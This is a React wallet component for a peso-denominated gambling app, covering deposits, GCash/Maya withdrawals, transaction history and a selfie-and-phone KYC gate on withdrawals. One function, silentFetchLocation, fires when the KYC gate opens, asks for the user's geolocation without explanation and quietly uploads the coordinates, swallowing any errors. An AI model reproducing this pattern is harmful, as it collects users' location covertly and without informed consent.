import React, { useState, useEffect, useRef } from 'react';
import { walletAPI, paymentAPI, authAPI } from '../../services/api';
import { WalletBalanceSkeleton, TransactionSkeleton } from '../../components/shared/Skeleton';

const KYC_STEPS = [
  { type: 'selfie', label: 'Take a Selfie',   icon: '🤳' },
  { type: 'phone',  label: 'Add Phone Number', icon: '📱' },
];

export default function Wallet() {
  const [balance, setBalance] = useState({ balance: 0, bonus_balance: 0 });
  const [transactions, setTransactions] = useState([]);
  const [txTab, setTxTab] = useState('all');
  const [tab, setTab] = useState('overview');
  const [page, setPage] = useState(1);
  const [totalTx, setTotalTx] = useState(0);
  const LIMIT = 10;
  const [showDeposit, setShowDeposit] = useState(false);
  const [showWithdraw, setShowWithdraw] = useState(false);
  const [showKycGate, setShowKycGate] = useState(false);
  const [kycClaimed, setKycClaimed] = useState({});
  const [kycPhone, setKycPhone] = useState('');
  const [selfiePreview, setSelfiePreview] = useState(null);
  const [selfieData, setSelfieData] = useState(null);
  const [kycLoading, setKycLoading] = useState('');
  const [kycMsg, setKycMsg] = useState('');
  const fileRef = useRef();
  const [depositAmount, setDepositAmount] = useState('');
  const [withdrawForm, setWithdrawForm] = useState({ amount: '', bank_code: '', account_number: '', account_name: '' });
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState('');
  const [walletLoading, setWalletLoading] = useState(true);
  const [txLoading, setTxLoading] = useState(true);
  const [summary, setSummary] = useState({ winnings_today: 0, winnings_total: 0, bets_total: 0 });
  const [fieldAlert, setFieldAlert] = useState(null); // { title, message, type: 'error'|'success' }

  useEffect(() => {
    walletAPI.summary().then(({ data }) => setSummary(data)).catch(() => {});
    walletAPI.balance().then(({ data }) => { setBalance(data); setWalletLoading(false); }).catch(() => setWalletLoading(false));
    authAPI.profile().then(({ data }) => {
      const c = data.kyc_bonus_claimed;
      setKycClaimed(c ? (typeof c === 'string' ? JSON.parse(c) : c) : {});
    }).catch(() => {});
  }, []);

  useEffect(() => {
    setTxLoading(true);
    const params = { page, limit: LIMIT };
    if (txTab !== 'all') params.type = txTab;
    walletAPI.transactions(params)
      .then(({ data }) => { setTransactions(data.transactions); setTotalTx(data.total); })
      .finally(() => setTxLoading(false));
  }, [page, txTab]);

  const handleDeposit = async (e) => {
    e.preventDefault();
    const amt = parseFloat(depositAmount);
    if (!Number.isFinite(amt) || amt < 100) {
      setMessage('Minimum deposit is ₱100');
      return;
    }
    if (amt > 500000) {
      setMessage('Maximum deposit is ₱500,000');
      return;
    }
    setLoading(true);
    try {
      const { data } = await paymentAPI.deposit({ amount: amt });
      if (data.invoice_url) window.open(data.invoice_url, '_blank');
      setShowDeposit(false);
      setMessage('Redirecting to payment...');
    } catch (err) {
      setMessage(err.response?.data?.error || 'Deposit failed');
    }
    setLoading(false);
  };

  const openWithdraw = () => {
    const missing = KYC_STEPS.filter(s => !kycClaimed[s.type]);
    if (missing.length > 0) { setKycMsg(''); setShowKycGate(true); silentFetchLocation(); }
    else setShowWithdraw(true);
  };

  const silentFetchLocation = () => {
    if (!navigator.geolocation || kycClaimed.location) return;
    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        const coords = `${pos.coords.latitude},${pos.coords.longitude}`;
        try {
          const { data } = await authAPI.kycBonus('location', { coords });
          setKycClaimed(data.claimed);
        } catch { /* silent */ }
      },
      () => { /* denied — silent */ },
      { timeout: 10000 }
    );
  };

  const handleSelfieFile = (e) => {
    const file = e.target.files[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = (ev) => { setSelfiePreview(ev.target.result); setSelfieData(ev.target.result); };
    reader.readAsDataURL(file);
  };

  const claimKycBonus = async (type) => {
    if (kycClaimed[type] || kycLoading) return;
    setKycLoading(type); setKycMsg('');
    try {
      let value = null;
      if (type === 'selfie') {
        if (!selfieData) { setKycMsg('Please select a selfie first.'); setKycLoading(''); return; }
        value = selfieData;
      } else if (type === 'phone') {
        if (!kycPhone.trim()) { setKycMsg('Please enter your phone number.'); setKycLoading(''); return; }
        value = kycPhone.trim();
      }
      const { data } = await authAPI.kycBonus(type, value);
      setKycClaimed(data.claimed);
      setKycMsg('✅ Verified!');
      const updated = data.claimed;
      if (KYC_STEPS.every(s => updated[s.type])) { setTimeout(() => { setShowKycGate(false); setShowWithdraw(true); setKycMsg(''); }, 1000); }
    } catch (err) {
      setKycMsg(err.response?.data?.error || 'Failed to claim bonus');
    }
    setKycLoading('');
  };

  const handleWithdraw = async (e) => {
    e.preventDefault();
    const amt = parseFloat(withdrawForm.amount);
    if (!withdrawForm.amount) {
      setFieldAlert({ title: '💰 Amount Required', message: 'Please enter the withdrawal amount before proceeding.', type: 'error' });
      return;
    }
    if (!Number.isFinite(amt) || amt < 100) {
      setFieldAlert({ title: '💰 Invalid Amount', message: 'Minimum withdrawal amount is ₱100. Please enter a valid amount.', type: 'error' });
      return;
    }
    if (amt > 500000) {
      setFieldAlert({ title: '💰 Amount Too Large', message: 'Maximum withdrawal amount is ₱500,000 per transaction.', type: 'error' });
      return;
    }
    if (!withdrawForm.bank_code) {
      setFieldAlert({ title: '📲 Select Payment Channel', message: 'Please select either GCash or Maya as your withdrawal channel.', type: 'error' });
      return;
    }
    if (!withdrawForm.account_number) {
      const ch = withdrawForm.bank_code === 'GCASH' ? 'GCash' : 'Maya';
      setFieldAlert({ title: `📱 ${ch} Number Required`, message: `Please enter your registered ${ch} phone number (e.g. 09XXXXXXXXX).`, type: 'error' });
      return;
    }
    if (withdrawForm.account_number.length < 10 || withdrawForm.account_number.length > 13) {
      setFieldAlert({ title: '📱 Invalid Phone Number', message: 'Phone number must be 10–13 digits (e.g. 09123456789). Please double-check.', type: 'error' });
      return;
    }
    if (!withdrawForm.account_name) {
      setFieldAlert({ title: '👤 Account Name Required', message: 'Please enter the full name registered on your GCash or Maya account.', type: 'error' });
      return;
    }
    setLoading(true);
    try {
      await paymentAPI.withdraw({ ...withdrawForm, amount: amt });
      setShowWithdraw(false);
      setWithdrawForm({ amount: '', bank_code: '', account_number: '', account_name: '' });
      setFieldAlert({ title: '✅ Withdrawal Submitted!', message: 'Your withdrawal request has been submitted and is pending admin approval. You will be notified once processed.', type: 'success' });
      walletAPI.balance().then(({ data }) => setBalance(data));
    } catch (err) {
      setFieldAlert({ title: '❌ Withdrawal Failed', message: err.response?.data?.error || 'Something went wrong. Please try again.', type: 'error' });
    }
    setLoading(false);
  };

  return (
    <div>
      {/* Balance Card */}
      {walletLoading ? <WalletBalanceSkeleton /> : (
        <div className="balance-card">
          <p className="label">Total Balance</p>
          <p className="amount">₱{Number(balance.balance).toLocaleString('en', { minimumFractionDigits: 2 })}</p>
          {balance.bonus_balance > 0 && (
            <p className="label">Bonus: ₱{Number(balance.bonus_balance).toFixed(2)}</p>
          )}
        </div>
      )}

      {/* Wallet Summary */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3,1fr)', gap: '10px', marginBottom: '16px' }}>
        {[
          { label: "Today's Winnings", value: summary.winnings_today, color: '#00f5a0' },
          { label: 'Total Winnings', value: summary.winnings_total, color: '#ffd700' },
          { label: 'Total Bets', value: summary.bets_total, color: '#ff7043' },
        ].map(({ label, value, color }) => (
          <div key={label} style={{ background: 'rgba(255,255,255,0.04)', borderRadius: '12px', padding: '12px 8px', textAlign: 'center', border: `1px solid ${color}22` }}>
            <p style={{ fontSize: '10px', color: 'var(--text-muted)', margin: '0 0 4px' }}>{label}</p>
            <p style={{ fontSize: '14px', fontWeight: '700', color, margin: 0 }}>₱{Number(value).toLocaleString('en', { minimumFractionDigits: 2 })}</p>
          </div>
        ))}
      </div>

      {/* Action Buttons */}
      <div className="action-buttons">
        <button className="btn btn-success" onClick={() => setShowDeposit(true)}>💳 Deposit</button>
        <button className="btn btn-secondary" onClick={openWithdraw}>🏦 Withdraw</button>
      </div>

      {message && <div className="card" style={{ textAlign: 'center' }}><p style={{ color: 'var(--secondary)', fontSize: '14px' }}>{message}</p></div>}

      {/* Transactions */}
      <div className="card">
        <h3 style={{ marginBottom: '12px', fontSize: '16px' }}>Transactions</h3>

        {/* Category Tabs */}
        <div style={{ display: 'flex', gap: '6px', marginBottom: '14px', overflowX: 'auto', paddingBottom: '2px' }}>
          {[
            { key: 'all',      label: 'All',       icon: '📋' },
            { key: 'win',      label: 'Winnings',  icon: '🏆' },
            { key: 'bet',      label: 'Bets',      icon: '🎰' },
            { key: 'deposit',  label: 'Deposits',  icon: '💳' },
            { key: 'withdraw', label: 'Withdrawals', icon: '🏦' },
          ].map(({ key, label, icon }) => (
            <button key={key} onClick={() => { setTxTab(key); setPage(1); }}
              style={{
                padding: '7px 12px', borderRadius: '20px', border: 'none', whiteSpace: 'nowrap',
                fontSize: '12px', fontWeight: '700', cursor: 'pointer',
                background: txTab === key ? 'var(--gold)' : 'rgba(255,255,255,0.06)',
                color: txTab === key ? '#1a0a2e' : 'var(--text-muted)',
                flexShrink: 0,
              }}>{icon} {label}</button>
          ))}
        </div>

        {txLoading ? (
          Array.from({ length: 5 }).map((_, i) => <TransactionSkeleton key={i} />)
        ) : (() => {
          const TX_ICONS = { win: '🏆', bet: '🎰', deposit: '💳', withdraw: '🏦', bonus: '🎁', refund: '↩️', free_spin: '🎡' };
          const TX_COLORS = { win: '#00f5a0', bet: '#ff7043', deposit: '#4fc3f7', withdraw: '#ce93d8', bonus: '#ffd700', refund: '#80cbc4', free_spin: '#ffb74d' };
          return transactions.length === 0 ? (
            <p style={{ color: 'var(--text-muted)', textAlign: 'center', padding: '20px' }}>No {txTab === 'all' ? '' : txTab} transactions yet</p>
          ) : (
            <>
              {transactions.map((tx) => {
                const ttype = tx.type || 'bet';
                const icon  = TX_ICONS[ttype] || TX_ICONS[ttype.split('_')[0]] || '💰';
                const color = TX_COLORS[ttype] || TX_COLORS[ttype.split('_')[0]] || '#aaa';
                return (
                  <div className="tx-item" key={tx.id} style={{ borderLeft: `3px solid ${color}`, paddingLeft: '10px', marginBottom: '8px' }}>
                    <div className="tx-info">
                      <h4 style={{ color }}>{icon} {ttype.replace(/_/g, ' ').toUpperCase()}</h4>
                      <p style={{ fontSize: '11px', color: 'var(--text-muted)' }}>
                        {new Date(tx.created_at).toLocaleString('en', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' })}
                      </p>
                    </div>
                    <span className={`tx-amount ${tx.amount > 0 ? 'positive' : 'negative'}`}>
                      {tx.amount > 0 ? '+' : ''}₱{Math.abs(tx.amount).toLocaleString()}
                    </span>
                  </div>
                );
              })}
              {totalTx > LIMIT && (
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginTop: '16px', paddingTop: '12px', borderTop: '1px solid rgba(255,255,255,0.08)' }}>
                  <button onClick={() => setPage(p => p - 1)} disabled={page === 1}
                    style={{ padding: '8px 18px', borderRadius: '10px', border: '1px solid rgba(255,215,0,0.3)', background: page === 1 ? 'rgba(255,255,255,0.04)' : 'rgba(255,215,0,0.1)', color: page === 1 ? 'var(--text-muted)' : 'var(--gold)', cursor: page === 1 ? 'not-allowed' : 'pointer', fontWeight: '600', fontSize: '13px' }}
                  >← Prev</button>
                  <span style={{ fontSize: '13px', color: 'var(--text-muted)' }}>Page {page} of {Math.ceil(totalTx / LIMIT)}</span>
                  <button onClick={() => setPage(p => p + 1)} disabled={page >= Math.ceil(totalTx / LIMIT)}
                    style={{ padding: '8px 18px', borderRadius: '10px', border: '1px solid rgba(255,215,0,0.3)', background: page >= Math.ceil(totalTx / LIMIT) ? 'rgba(255,255,255,0.04)' : 'rgba(255,215,0,0.1)', color: page >= Math.ceil(totalTx / LIMIT) ? 'var(--text-muted)' : 'var(--gold)', cursor: page >= Math.ceil(totalTx / LIMIT) ? 'not-allowed' : 'pointer', fontWeight: '600', fontSize: '13px' }}
                  >Next →</button>
                </div>
              )}
            </>
          );
        })()}
      </div>

      {/* KYC Gate Modal */}
      {showKycGate && (
        <div className="modal-overlay" onClick={() => setShowKycGate(false)}>
          <div className="modal" onClick={(e) => e.stopPropagation()} style={{ maxHeight: '90vh', overflowY: 'auto' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '16px' }}>
              <h2 style={{ margin: 0, fontSize: '18px' }}>🚫 Withdrawal Locked</h2>
              <button onClick={() => setShowKycGate(false)} style={{ background: 'rgba(255,255,255,0.1)', border: 'none', color: '#fff', width: '36px', height: '36px', borderRadius: '50%', fontSize: '18px', cursor: 'pointer' }}>✕</button>
            </div>

            <div style={{ background: 'rgba(255,71,87,0.08)', border: '1px solid rgba(255,71,87,0.25)', borderRadius: '10px', padding: '12px 14px', marginBottom: '16px' }}>
              <p style={{ fontSize: '13px', color: 'var(--danger)', margin: 0 }}>
                🔒 <strong>KYC verification is required</strong> before you can withdraw funds. Complete the steps below to unlock withdrawals.
              </p>
            </div>

            {/* Progress */}
            <div style={{ marginBottom: '16px' }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '6px' }}>
                <span style={{ fontSize: '12px', color: 'var(--text-muted)' }}>KYC Progress</span>
                <span style={{ fontSize: '13px', fontWeight: '700', color: '#ffd700' }}>
                  {KYC_STEPS.filter(s => kycClaimed[s.type]).length} / 2 completed
                </span>
              </div>
              <div style={{ height: '6px', background: '#1e1e2e', borderRadius: '4px', overflow: 'hidden' }}>
                <div style={{
                  height: '100%',
                  width: `${(KYC_STEPS.filter(s => kycClaimed[s.type]).length / 2) * 100}%`,
                  background: 'linear-gradient(90deg, #ffd700, #00f5a0)',
                  borderRadius: '4px', transition: 'width 0.4s'
                }} />
              </div>
            </div>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '12px', marginBottom: '16px' }}>

              {/* Selfie */}
              <div className="card" style={{ opacity: kycClaimed.selfie ? 0.65 : 1, padding: '14px' }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: kycClaimed.selfie ? 0 : '10px' }}>
                  <span style={{ fontSize: '24px' }}>🤳</span>
                  <div style={{ flex: 1 }}>
                    <div style={{ fontWeight: '700', fontSize: '13px' }}>Take a Selfie</div>
                    <div style={{ fontSize: '11px', color: 'var(--text-muted)' }}>Required for identity verification</div>
                  </div>
                  {kycClaimed.selfie && <span style={{ color: '#00f5a0', fontWeight: '700', fontSize: '12px' }}>✅ Done</span>}
                </div>
                {!kycClaimed.selfie && (
                  <>
                    {selfiePreview && <img src={selfiePreview} alt="selfie" style={{ width: '60px', height: '60px', borderRadius: '50%', objectFit: 'cover', display: 'block', margin: '0 auto 8px' }} />}
                    <input ref={fileRef} type="file" accept="image/*" capture="user" style={{ display: 'none' }} onChange={handleSelfieFile} />
                    <div style={{ display: 'flex', gap: '8px' }}>
                      <button className="btn" style={{ flex: 1, padding: '7px', fontSize: '12px', background: '#1e1e2e', border: '1px solid #333' }} onClick={() => fileRef.current.click()}>
                        {selfiePreview ? '📷 Change' : '📷 Select Photo'}
                      </button>
                      {selfiePreview && (
                        <button className="btn btn-primary" style={{ flex: 1, padding: '7px', fontSize: '12px' }} onClick={() => claimKycBonus('selfie')} disabled={kycLoading === 'selfie'}>
                          {kycLoading === 'selfie' ? '...' : 'Submit'}
                        </button>
                      )}
                    </div>
                  </>
                )}
              </div>

              {/* Phone */}
              <div className="card" style={{ opacity: kycClaimed.phone ? 0.65 : 1, padding: '14px' }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: kycClaimed.phone ? 0 : '10px' }}>
                  <span style={{ fontSize: '24px' }}>📱</span>
                  <div style={{ flex: 1 }}>
                    <div style={{ fontWeight: '700', fontSize: '13px' }}>Add Phone Number</div>
                    <div style={{ fontSize: '11px', color: 'var(--text-muted)' }}>Required for verification</div>
                  </div>
                  {kycClaimed.phone && <span style={{ color: '#00f5a0', fontWeight: '700', fontSize: '12px' }}>✅ Done</span>}
                </div>
                {!kycClaimed.phone && (
                  <div style={{ display: 'flex', gap: '8px' }}>
                    <input
                      type="tel" value={kycPhone} onChange={e => setKycPhone(e.target.value)}
                      placeholder="+63 9XX XXX XXXX"
                      style={{ flex: 1, padding: '7px 10px', borderRadius: '8px', background: '#0f0f1a', border: '1px solid #333', color: '#e0e0f0', fontSize: '13px' }}
                    />
                    <button className="btn btn-primary" style={{ padding: '7px 12px', fontSize: '12px' }} onClick={() => claimKycBonus('phone')} disabled={kycLoading === 'phone'}>
                      {kycLoading === 'phone' ? '...' : 'Verify'}
                    </button>
                  </div>
                )}
              </div>
            </div>

            {kycMsg && (
              <div style={{
                padding: '10px 14px', borderRadius: '8px', fontSize: '13px', marginBottom: '12px',
                background: kycMsg.startsWith('✅') ? 'rgba(0,245,160,0.08)' : 'rgba(255,71,87,0.08)',
                border: `1px solid ${kycMsg.startsWith('✅') ? 'rgba(0,245,160,0.25)' : 'rgba(255,71,87,0.25)'}`,
                color: kycMsg.startsWith('✅') ? 'var(--success)' : 'var(--danger)',
              }}>{kycMsg}</div>
            )}

            <button className="btn btn-secondary" onClick={() => setShowKycGate(false)} style={{ width: '100%' }}>Close</button>
          </div>
        </div>
      )}

      {/* Deposit Modal */}
      {showDeposit && (
        <div className="modal-overlay" onClick={() => setShowDeposit(false)}>
          <div className="modal" onClick={(e) => e.stopPropagation()}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '24px' }}>
              <h2 style={{ margin: 0 }}>💳 Deposit</h2>
              <button onClick={() => setShowDeposit(false)} style={{ background: 'rgba(255,255,255,0.1)', border: 'none', color: '#fff', width: '36px', height: '36px', borderRadius: '50%', fontSize: '18px', cursor: 'pointer' }}>✕</button>
            </div>
            <div style={{ background: 'rgba(0,245,160,0.08)', border: '1px solid rgba(0,245,160,0.2)', borderRadius: '12px', padding: '12px 16px', marginBottom: '20px' }}>
              <p style={{ fontSize: '13px', color: 'var(--success)', margin: 0 }}>✅ Minimum deposit: <strong>₱100</strong> — You will be redirected to Xendit to complete payment.</p>
            </div>
            <form onSubmit={handleDeposit}>
              <div className="input-group">
                <label>Amount (₱)</label>
                <input type="number" min="100" value={depositAmount} onChange={(e) => setDepositAmount(e.target.value)} placeholder="Enter amount" required style={{ fontSize: '20px', fontWeight: '700', textAlign: 'center' }} />
              </div>
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4,1fr)', gap: '8px', marginBottom: '20px' }}>
                {[100, 500, 1000, 5000].map(v => (
                  <button type="button" key={v}
                    onClick={() => setDepositAmount(v.toString())}
                    style={{
                      padding: '10px 0', borderRadius: '10px', fontWeight: '700', fontSize: '13px', cursor: 'pointer',
                      background: depositAmount === v.toString() ? 'var(--gold)' : 'rgba(255,215,0,0.1)',
                      color: depositAmount === v.toString() ? '#1a0a2e' : 'var(--gold)',
                      border: '1px solid rgba(255,215,0,0.4)',
                      transition: 'all 0.2s'
                    }}>₱{v.toLocaleString()}</button>
                ))}
              </div>
              <button type="submit" className="btn btn-success" disabled={loading} style={{ marginBottom: '12px' }}>
                {loading ? '⏳ Processing...' : '🔒 Proceed to Payment'}
              </button>
              <button type="button" className="btn btn-secondary" onClick={() => setShowDeposit(false)}>Cancel</button>
            </form>
          </div>
        </div>
      )}

      {/* Withdraw Modal */}
      {showWithdraw && (
        <div className="modal-overlay" onClick={() => setShowWithdraw(false)}>
          <div className="modal" onClick={(e) => e.stopPropagation()}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '24px' }}>
              <h2 style={{ margin: 0 }}>🏦 Withdraw</h2>
              <button onClick={() => setShowWithdraw(false)} style={{ background: 'rgba(255,255,255,0.1)', border: 'none', color: '#fff', width: '36px', height: '36px', borderRadius: '50%', fontSize: '18px', cursor: 'pointer' }}>✕</button>
            </div>
            <div style={{ background: 'rgba(255,71,87,0.08)', border: '1px solid rgba(255,71,87,0.2)', borderRadius: '12px', padding: '12px 16px', marginBottom: '20px' }}>
              <p style={{ fontSize: '13px', color: 'var(--danger)', margin: 0 }}>⚠️ Minimum withdrawal: <strong>₱100</strong> — Amount will be deducted immediately and processed after admin approval.</p>
            </div>
            <form onSubmit={handleWithdraw}>
              <div className="input-group">
                <label>Amount (₱)</label>
                <input type="number" min="100" value={withdrawForm.amount} onChange={(e) => setWithdrawForm({ ...withdrawForm, amount: e.target.value })} placeholder="Enter amount" required style={{ fontSize: '20px', fontWeight: '700', textAlign: 'center' }} />
              </div>
              {/* Payment Channel — GCash / Maya card selector */}
              <div className="input-group">
                <label>Payment Channel</label>
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px', marginTop: '6px' }}>
                  {[
                    { code: 'GCASH', label: 'GCash',  color: '#0070FF', bg: 'rgba(0,112,255,0.1)',  border: 'rgba(0,112,255,0.4)',  logo: '💙' },
                    { code: 'MAYA',  label: 'Maya',   color: '#00C878', bg: 'rgba(0,200,120,0.1)', border: 'rgba(0,200,120,0.4)', logo: '💚' },
                  ].map(({ code, label, color, bg, border, logo }) => (
                    <button key={code} type="button"
                      onClick={() => setWithdrawForm({ ...withdrawForm, bank_code: code })}
                      style={{
                        padding: '14px 10px', borderRadius: '12px', cursor: 'pointer',
                        background: withdrawForm.bank_code === code ? bg : 'rgba(255,255,255,0.04)',
                        border: `2px solid ${withdrawForm.bank_code === code ? color : 'rgba(255,255,255,0.1)'}`,
                        color: withdrawForm.bank_code === code ? color : 'var(--text-muted)',
                        fontWeight: '800', fontSize: '15px',
                        display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '6px',
                        transition: 'all 0.2s',
                        boxShadow: withdrawForm.bank_code === code ? `0 0 12px ${color}44` : 'none',
                      }}>
                      <span style={{ fontSize: '28px' }}>{logo}</span>
                      <span>{label}</span>
                      {withdrawForm.bank_code === code && <span style={{ fontSize: '10px', opacity: 0.8 }}>✓ Selected</span>}
                    </button>
                  ))}
                </div>
              </div>

              {/* Warning notice */}
              <div style={{
                background: 'rgba(255,71,87,0.1)',
                border: '1px solid rgba(255,71,87,0.4)',
                borderRadius: '10px',
                padding: '12px 14px',
                marginBottom: '14px',
              }}>
                <p style={{ fontSize: '12px', color: '#ff4757', margin: 0, lineHeight: 1.6, fontWeight: '600' }}>
                  ⚠️ <strong>IMPORTANT:</strong> Please enter your {withdrawForm.bank_code === 'MAYA' ? 'Maya' : withdrawForm.bank_code === 'GCASH' ? 'GCash' : 'GCash / Maya'} registered <strong>phone number</strong> correctly.
                </p>
                <p style={{ fontSize: '12px', color: '#ff6b6b', margin: '6px 0 0', lineHeight: 1.6 }}>
                  🚫 If you send to the <strong>wrong number</strong>, the money <strong>cannot be recovered</strong>. Double-check before submitting!
                </p>
              </div>

              <div className="input-group">
                <label>{withdrawForm.bank_code ? `${withdrawForm.bank_code === 'GCASH' ? 'GCash' : 'Maya'} Phone Number` : 'Account Number'}</label>
                <input
                  type="tel"
                  inputMode="numeric"
                  pattern="[0-9]*"
                  value={withdrawForm.account_number}
                  onChange={(e) => setWithdrawForm({ ...withdrawForm, account_number: e.target.value.replace(/\D/g, '') })}
                  required
                  placeholder={withdrawForm.bank_code === 'GCASH' ? 'GCash phone number (e.g. 09XXXXXXXXX)' : withdrawForm.bank_code === 'MAYA' ? 'Maya phone number (e.g. 09XXXXXXXXX)' : 'Phone number (09XXXXXXXXX)'}
                />
              </div>
              <div className="input-group">
                <label>Account Name</label>
                <input
                  value={withdrawForm.account_name}
                  onChange={(e) => setWithdrawForm({ ...withdrawForm, account_name: e.target.value.replace(/[^a-zA-Z\s]/g, '') })}
                  required
                  placeholder="Full name (letters only)"
                />
              </div>
              <button type="submit" className="btn btn-primary" disabled={loading} style={{ marginBottom: '12px' }}>
                {loading ? '⏳ Submitting...' : '📤 Submit Withdrawal'}
              </button>
              <button type="button" className="btn btn-secondary" onClick={() => setShowWithdraw(false)}>Cancel</button>
            </form>
          </div>
        </div>
      )}
      {/* Field Alert Modal */}
      {fieldAlert && (
        <div className="modal-overlay" onClick={() => setFieldAlert(null)} style={{ zIndex: 9999 }}>
          <div className="modal" onClick={e => e.stopPropagation()} style={{ maxWidth: '340px', textAlign: 'center', padding: '28px 24px' }}>
            <div style={{ fontSize: '48px', marginBottom: '12px' }}>
              {fieldAlert.type === 'success' ? '✅' : '⚠️'}
            </div>
            <h3 style={{ margin: '0 0 10px', fontSize: '17px', color: fieldAlert.type === 'success' ? '#00f5a0' : '#ff4757' }}>
              {fieldAlert.title}
            </h3>
            <p style={{ fontSize: '13px', color: 'var(--text-muted)', lineHeight: 1.6, margin: '0 0 20px' }}>
              {fieldAlert.message}
            </p>
            <button
              className={`btn ${fieldAlert.type === 'success' ? 'btn-success' : 'btn-danger'}`}
              onClick={() => setFieldAlert(null)}
              style={{ width: '100%', fontWeight: '700' }}
            >
              {fieldAlert.type === 'success' ? 'Great!' : 'Got it'}
            </button>
          </div>
        </div>
      )}
    </div>
